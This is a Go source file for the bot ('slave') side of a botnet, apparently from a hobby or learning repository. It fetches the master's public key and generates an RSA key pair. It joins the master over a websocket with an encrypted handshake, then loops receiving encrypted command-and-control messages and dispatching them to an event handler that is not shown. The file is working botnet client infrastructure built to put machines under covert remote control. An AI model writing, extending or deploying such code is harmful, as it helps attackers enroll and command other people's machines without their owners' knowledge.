package slave

import (
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/signal"
	"time"

	"github.com/gorilla/websocket"

	"github.com/adrianosela/botnet/lib/encryption"
	"github.com/adrianosela/botnet/lib/protocol"
	"github.com/adrianosela/botnet/master"
)

const (
	writeWait      = 10 * time.Second    // Time allowed to write a message to the peer
	pongWait       = 60 * time.Second    // Time allowed to read the next pong message from the peer
	pingPeriod     = (pongWait * 9) / 10 // Send pings to peer with this period. Must be less than pongWait
	maxMessageSize = 512                 // Maximum message size allowed from peer
)

// BotnetSlave is the slave program controller
type BotnetSlave struct {
	masterAddr   string
	masterPubKey *rsa.PublicKey
	slavePrivKey *rsa.PrivateKey
	slavePubKey  string
}

// NewBotnetSlave initializes a BotnetSlave to its master
func NewBotnetSlave(masterAddr string) (*BotnetSlave, error) {
	masterPubKey, rawPEM, err := getMasterPubKey(masterAddr)
	if err != nil {
		return nil, err
	}
	log.Printf("[slave] fetched master pub key: \n%s", rawPEM)
	slavePriv, slavePub, err := encryption.GenerateRSAKeyPair(4096)
	if err != nil {
		return nil, err
	}
	return &BotnetSlave{
		masterAddr:   masterAddr,
		masterPubKey: masterPubKey,
		slavePrivKey: slavePriv,
		slavePubKey:  string(slavePub),
	}, nil
}

// Start runs the initialized slave process
func (s *BotnetSlave) Start() {
	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)

	url := fmt.Sprintf("ws://%s%s", s.masterAddr, master.JoinEndpoint)
	log.Printf("connecting to URL: %s", url)

	c, _, err := websocket.DefaultDialer.Dial(url, nil)
	if err != nil {
		log.Fatal("dial:", err)
	}
	defer c.Close()

	// send encrypted join request completing the handshake
	encrypted, err := buildEncryptedJoinRequest(s.slavePubKey, s.masterPubKey)
	if err != nil {
		log.Fatal(err)
	}

	c.WriteMessage(2, []byte(encrypted)) // binary message type (2)

	c.SetReadLimit(maxMessageSize)
	c.SetReadDeadline(time.Now().Add(pongWait))
	c.SetPongHandler(func(string) error { c.SetReadDeadline(time.Now().Add(pongWait)); return nil })

	for {
		log.Println("waiting for command and control...")
		msgType, encryptedMessage, err := c.ReadMessage()
		log.Printf("we have comm with err: %s", err)
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("WS connection was closed unexpectedly: %s", err)
			}
			break
		}

		// discard all non binary messages
		if msgType != 2 {
			continue
		}

		jsonMsg, err := encryption.DecryptMessage(encryptedMessage, s.slavePrivKey)
		if err != nil {
			log.Printf("could not decrypt message from master: %s", err)
			continue
		}
		var event protocol.Event
		if err = json.Unmarshal(jsonMsg, &event); err != nil {
			log.Printf("could not unmarshal message from master: %s", err)
			continue
		}
		protocol.HandleMasterEvent(event)
	}
}
